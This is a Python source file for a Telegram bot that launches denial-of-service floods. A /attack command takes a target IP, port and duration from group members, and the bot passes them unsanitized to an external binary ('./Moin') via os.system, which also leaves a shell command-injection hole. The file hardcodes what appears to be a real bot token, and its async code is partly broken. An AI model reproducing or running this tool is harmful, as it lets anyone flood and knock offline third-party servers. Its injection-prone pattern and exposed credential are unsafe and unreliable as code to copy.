import os
import telebot
import logging
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

# Configuration
TOKEN = '7911595205:AAFdjH0vbs6IMx371k5jSd9z51Kof1qT47U'  # Replace with your actual bot token
ALLOWED_GROUP_ID = -1002428694270  # Replace with your specific group's ID
ADMIN_USER_ID = 8179218740
CHANNEL_USERNAME = "@mustafaleaks2"  # Replace with your actual channel username

logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_in_progress = False

# Function to Check if Message is from the Allowed Group
def is_allowed_group(message):
    return message.chat.id == ALLOWED_GROUP_ID

# Function to Check Channel Membership
def is_user_member(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logging.error(f"Error checking membership: {e}")
        return False

# Start Command
@bot.message_handler(commands=['start'])
def handle_start(message):
    if not is_allowed_group(message):
        bot.reply_to(message, "🤡 YAHA SE BHAG PUBLIC GROUPME USE KR!")
        return

    user_id = message.from_user.id
    if not is_user_member(user_id):
        bot.reply_to(
            message,
            f"🚫 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧!\n\n"
            f"🔗 𝗝𝗢𝗜𝗡 𝗡𝗢𝗪: [Join Channel](https://t.me/+aTykrekd1YJlNDc1)",
            parse_mode="Markdown"
        )
        return

    bot.reply_to(message, "✅ Wᴇʟᴄᴏᴍᴇ! Yᴏᴜ Cᴀɴ Nᴏᴡ Usᴇ Tʜᴇ Bᴏᴛ.")

# Attack Command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global attack_in_progress

    if not is_allowed_group(message):
        bot.reply_to(message, "🤡 YAHA SE BHAG PUBLIC GROUPME USE KR!")
        return

    user_id = message.from_user.id
    if not is_user_member(user_id):
        bot.reply_to(
            message,
            f"🚫 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧!\n\n"
            f"🔗 𝗝𝗢𝗜𝗡 𝗡𝗢𝗪: [Join Channel](https://t.me/+aTykrekd1YJlNDc1)",
            parse_mode="Markdown"
        )
        return

    if attack_in_progress:
        bot.reply_to(message, "⏰ Aɴ Aᴛᴛᴀᴄᴋ Iɴ Pʀᴏɢʀᴇss. Pʟᴇᴀsᴇ Wᴀɪᴛ.")
        return

    try:
        args = message.text.split()
        target_ip, target_port, duration = args[1], int(args[2]), int(args[3])

        if duration > 150:
            bot.reply_to(message, "⚠️ Mᴀxɪᴍᴜᴍ Aᴛᴛᴀᴄᴋ Dᴜʀᴀᴛɪᴏɴ Is 150 Sᴇᴄᴏɴᴅs!")
            return

        if target_port in blocked_ports:
            bot.reply_to(message, "🚫 This port is blocked. Choose another port.")
            return

        attack_in_progress = True

        bot.reply_to(message, f"🚀 **𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!**\n🎯 Target: {target_ip}:{target_port}\n⏳ Duration: {duration} seconds\n📈 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗜𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀....", parse_mode="Markdown")

        # Start attack in a non-blocking async task
        asyncio.create_task(run_attack(message, target_ip, target_port, duration))

    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.reply_to(message, "🚀 Usage: `/attack <IP> <Port> <Time>`", parse_mode="Markdown")

# Updated Attack Function (Non-Blocking)
async def run_attack(message, target_ip, target_port, duration):
    global attack_in_progress
    try:
        os.system(f"./Moin {target_ip} {target_port} {duration} 1000")

        # Wait for attack duration asynchronously
        await asyncio.sleep(5)

        attack_in_progress = False
        await bot.send_message(message.chat.id, f"✅ **𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!**\n🎯 Target: {target_ip}:{target_port}\n⏳ Duration: {duration} seconds", parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error running attack: {e}")
        await bot.send_message(message.chat.id, "❌ Error executing attack!")

# Start Asyncio Loop
def start_asyncio_thread():
    loop.run_forever()

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Bot is running...")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")

# 🔹 Run Bot
if __name__ == "__main__":
    bot.polling(none_stop=True)
